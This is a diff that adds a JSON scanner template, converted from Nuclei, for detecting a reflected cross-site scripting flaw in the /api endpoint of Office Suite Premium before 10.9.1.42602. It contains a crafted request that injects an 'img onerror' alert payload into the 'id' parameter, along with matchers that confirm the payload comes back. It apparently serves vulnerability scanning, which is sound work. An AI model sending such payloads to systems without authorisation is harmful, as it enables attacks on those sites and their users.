@@ -1,0 +1,117 @@
+{
+  "id": "office-suite-xss",
+  "name": "Office Suite Premium \u003c 10.9.1.42602 - Cross-Site Scripting",
+  "author": "r3Y3r53",
+  "severity": "MEDIUM",
+  "description": "Office Suite is suffering from an XSS vulnerability in the following parameter /api?path\u003dfiles\u0026id. Attackers often initiate an XSS attack by sending a malicious link to a user and enticing the user to click it.\n",
+  "references": [
+    "https://www.exploitalert.com/view-details.html?id\u003d39632"
+  ],
+  "tags": [
+    "xss",
+    "office",
+    "suite"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/api?path\u003dfiles\u0026id\u003ddfsse%3Cimg%20src%3da%20onerror%3dalert(document.domain)%3Ez1668cyj2pi\u0026revision\u003d%22%22\u0026type\u003d%22thumb%22\u0026command\u003durl\u0026expires\u003d1687785968527",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "status_code \u003d\u003d 200",
+            "contains(content_type, \"text/html\")",
+            "contains_all(body, \"\u003cimg src\u003da onerror\u003dalert(document.domain)\u003e\", \"\\\"payload\\\":\")"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "office-suite-xss",
+    "info": {
+      "name": "Office Suite Premium \u003c 10.9.1.42602 - Cross-Site Scripting",
+      "author": "r3Y3r53",
+      "severity": "medium",
+      "description": "Office Suite is suffering from an XSS vulnerability in the following parameter /api?path\u003dfiles\u0026id. Attackers often initiate an XSS attack by sending a malicious link to a user and enticing the user to click it.\n",
+      "reference": [
+        "https://www.exploitalert.com/view-details.html?id\u003d39632"
+      ],
+      "metadata": {
+        "max_request": 1
+      },
+      "tags": "xss,office,suite"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/api?path\u003dfiles\u0026id\u003ddfsse%3Cimg%20src%3da%20onerror%3dalert(document.domain)%3Ez1668cyj2pi\u0026revision\u003d%22%22\u0026type\u003d%22thumb%22\u0026command\u003durl\u0026expires\u003d1687785968527"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "status_code \u003d\u003d 200",
+              "contains(content_type, \"text/html\")",
+              "contains_all(body, \"\u003cimg src\u003da onerror\u003dalert(document.domain)\u003e\", \"\\\"payload\\\":\")"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
